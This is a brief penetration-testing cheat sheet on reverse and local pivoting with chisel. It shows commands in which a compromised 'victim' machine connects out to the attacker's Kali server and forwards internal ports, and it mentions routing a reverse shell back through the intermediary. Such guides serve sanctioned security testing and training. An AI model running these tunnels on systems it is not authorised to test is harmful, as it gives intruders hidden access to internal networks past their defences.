#### -- Reverse Pivot -- ####

Chisel is like SSH tunneling but everything is reversed.

Victim tunnels to hacker.

Victim == client

Hacker == server

https://github.com/richardcurteis/Cheat-Sheets-and-Guides/blob/master/Reverse%20Pivot.png

Set up server to listen on port 8000. Be verbose...

```kali:~# chisel server -p 8000 -reverse -v```

Create client and connect to server on port n and tell server which port to open (ip:port) and then where to forward traffic to, ```$target_ip:$target_port``` from that opened port.

```intermediary_victim:~# chisel client $kali_ip:8000 R:127.0.0.1:8001:$target_ip:$target_port```

NOTE: *Look at fingerprint option to ensure client only connects to intended servers*

Example: ```... --fingerprint 11:22:33...```

#### -- Port Forward/Local Pivot -- ####

If we have a shell on a non-routable mnachine to our attacking machine, set up the port forward on a machine that can connect to both and forward traffic through.

Once set up send reverse shell etc to intermediary machine to be routed through to attacker.

##### Spin up server on kali #####
```kali:~# chisel server -p 8000 -reverse -v```

##### Link client to server and forward traffic on localhost from 9001 to address foo on port bar. #####

```chisel client $kali_ip:8000 intermediary_port:target_ip:target_port```

```intermediary_victim:~# chisel client $kali_ip:8000 9001:127.0.0.1:8001```
